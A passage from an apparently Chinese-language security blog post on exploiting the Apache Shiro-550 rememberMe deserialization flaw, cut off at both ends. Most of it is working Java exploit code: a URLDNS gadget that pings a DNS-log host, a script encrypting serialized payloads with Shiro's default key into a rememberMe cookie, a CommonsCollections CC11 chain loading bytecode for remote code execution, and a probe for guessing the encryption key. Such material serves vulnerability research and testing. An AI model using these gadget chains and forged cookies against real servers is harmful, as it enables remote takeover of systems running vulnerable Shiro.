class="token punctuation">;</span>        <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"unchecked"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token class-name">T</span> deserialized <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> deserialized<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"Unable to deserialze argument byte array."</span><span class="token punctuation">;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SerializationException</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到调用了 readObject 方法，可以通过此处进行反序列化操作，既然已经找到了入口，那就回去看一下加密的过程，在加密中插入我们的 payload 触发反序列化执行 rce</p><p>加密过程也大致差不多</p><h2 id="4-Shiro-550-漏洞利用"><a href="#4-Shiro-550-漏洞利用" class="headerlink" title="4. Shiro-550 漏洞利用"></a>4. Shiro-550 漏洞利用</h2><h3 id="4-1-URLDNS-测试"><a href="#4-1-URLDNS-测试" class="headerlink" title="4.1 URLDNS 测试"></a>4.1 URLDNS 测试</h3><ul><li>URLDNS.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">URLDNS</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span> <span class="token punctuation">{</span>        <span class="token comment">// 新建 hashMap 入口类</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 目标 URL，此处不会发起请求</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://89ceeef4.dns.1433.eu.org"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 利用反射获取类的 hashCode 变量</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 绕过语言权限控制的权限</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 默认情况下为 -1,进行 DNS 请求，这里修改为 1234 则不进行 DNS 请求，将 URL写入到 文件中</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 触发反序列化</span>        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 重置</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">newOutputStream</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成 Cookie</p><ul><li>main.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>web<span class="token punctuation">.</span>mgt<span class="token punctuation">.</span></span><span class="token class-name">CookieRememberMeManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> main <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CookieRememberMeManager</span> cookieRememberMeManager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CookieRememberMeManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cookieRememberMeManager<span class="token punctuation">.</span><span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> cookieRememberMeManager<span class="token punctuation">.</span><span class="token function">getEncryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted-image-20230120232924.png"></p><p>查看 DNSLOG 平台</p><p><img src="/../../../../../pic/Pasted-image-20230120232931.png"></p><h3 id="4-2-CC11-链攻击"><a href="#4-2-CC11-链攻击" class="headerlink" title="4.2 CC11 链攻击"></a>4.2 CC11 链攻击</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token comment">// CC2 部分</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 绕过 if 确保进入</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_class"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 写入字节码</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:/Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// CC6 部分</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> expHashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"factory"</span><span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 执行序列化与反序列化</span><span class="token comment">//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">newOutputStream</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>expHashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><span class="token comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);</span><span class="token comment">//        objectInputStream.readObject();</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token class-name">Field</span> targetField <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用上面的加密脚本处理后丢到 rememberMe 发包</p><p><img src="/../../../../../pic/image-20230202032106519.png"></p><h2 id="5-漏洞检测"><a href="#5-漏洞检测" class="headerlink" title="5. 漏洞检测"></a>5. 漏洞检测</h2><p>该部分参考链接</p><p><a href="http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/">一种另类的shiro检测方式</a></p><p>检测是否是 Shiro 框架通常情况下是通过在 Cookie 中向 rememberMe 参数随机提供一个值判断响应头是否存在 <code>Set-Cookie：rememberMe=deleteMe</code> 来判断</p><h3 id="5-1-秘钥判断"><a href="#5-1-秘钥判断" class="headerlink" title="5.1 秘钥判断"></a>5.1 秘钥判断</h3><p>为了能够成功执行反序列化就要求我们获得准确的 key，当密钥不正确或类型转换异常时，目标响应头包含<code>Set-Cookie：rememberMe=deleteMe</code>字段，而当密钥正确且没有类型转换异常时，响应头不存在<code>Set-Cookie：rememberMe=deleteMe</code>字段。</p><p>l1nk3r 师傅的检测方法为在 key 正确的情况下不显示 deleteMe，反之则显示 deleteMe，从而高效检测 key 是否正确</p><p>实现该目标有两个要求 </p><ul><li><p>构造一个继承 <strong>PrincipalCollection</strong> 的序列化对象。</p></li><li><p>key正确情况下不返回 <strong>deleteMe</strong> ，key错误情况下返回 <strong>deleteMe</strong> 。</p></li></ul><h3 id="5-2-构造"><a href="#5-2-构造" class="headerlink" title="5.2 构造"></a>5.2 构造</h3><p>构造序列化</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>subject<span class="token punctuation">.</span></span><span class="token class-name">SimplePrincipalCollection</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">P</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">SimplePrincipalCollection</span> simplePrincipalCollection <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimplePrincipalCollection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>simplePrincipalCollection<span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后丢到加密</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>web<span class="token punctuation">.</span>mgt<span class="token punctuation">.</span></span><span class="token class-name">CookieRememberMeManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> main <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token 